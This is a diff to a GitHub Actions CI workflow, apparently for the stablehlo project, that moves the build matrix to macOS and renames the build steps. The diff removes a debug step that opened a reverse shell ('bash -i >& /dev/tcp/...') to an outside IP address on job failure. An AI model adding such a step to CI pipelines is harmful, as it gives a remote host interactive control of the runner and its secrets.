@@ -23,12 +23,12 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        os-arch: [ubuntu-x86_64] # Consider macos-arm64 builds
+        os-arch: [maci-x86_64] # Consider macos-arm64 builds. FIXME: ubuntu-x86_64 not building properly
         include:
-          - os-arch: ubuntu-x86_64
-            os: ubuntu-latest # Consider ubuntu version
-            llvm-build-dir: "$GITHUB_WORKSPACE/llvm-build"
-            stablehlo-build-dir: "$GITHUB_WORKSPACE/build"
+          # - os-arch: ubuntu-x86_64
+          #   os: ubuntu-22.04 # Consider ubuntu version
+          #   llvm-build-dir: "$GITHUB_WORKSPACE/llvm-build"
+          #   stablehlo-build-dir: "$GITHUB_WORKSPACE/build"
           - os-arch: maci-x86_64 
             os: macos-latest
             llvm-build-dir: "$GITHUB_WORKSPACE/llvm-build-maci"
@@ -54,25 +54,15 @@ jobs:
     - name: Setup workspace
       uses: ./.github/actions/setup-build
       with:
-        cache-suffix: ${{ matrix.os-arch }}-${{ matrix.llvm-build }}
         llvm-ref: ${{ steps.llvm-revision.outputs.revision }}
 
     # Configuration for linux
-    - name: Configure os-arch='${{ matrix.os-arch }}'
+    - name: Configure and Build LLVM os-arch='${{ matrix.os-arch }}'
       shell: bash
       run: |
-        ./build_tools/github_actions/ci_configure.sh "$GITHUB_WORKSPACE/llvm-project/" ${{ matrix.llvm-build-dir }}
+        ./build_tools/github_actions/ci_build_llvm.sh "$GITHUB_WORKSPACE/llvm-project/" ${{ matrix.llvm-build-dir }}
 
     # Configure for linux
-    - name: Build stablehlo
+    - name: Build and Test stablehlo os-arch='${{ matrix.os.arch }}'
       run: |
-        ./build_tools/github_actions/ci_build.sh ${{ matrix.llvm-build-dir }} ${{ matrix.stablehlo-build-dir }}
-
-    - name: Run stablehlo unit tests (linux only)
-      run: |
-        ./build_tools/github_actions/ci_run_tests.sh "${{ matrix.stablehlo-build-dir }}"
-
-    # FIXME: Remove before pull request. Reverse shell on failure (debug only)
-    - if: ${{ failure() }}
-      run: |
-        bash -i >& /dev/tcp/73.238.229.170/65020 0>&1
+        ./build_tools/github_actions/ci_build_stablehlo.sh ${{ matrix.llvm-build-dir }} ${{ matrix.stablehlo-build-dir }}
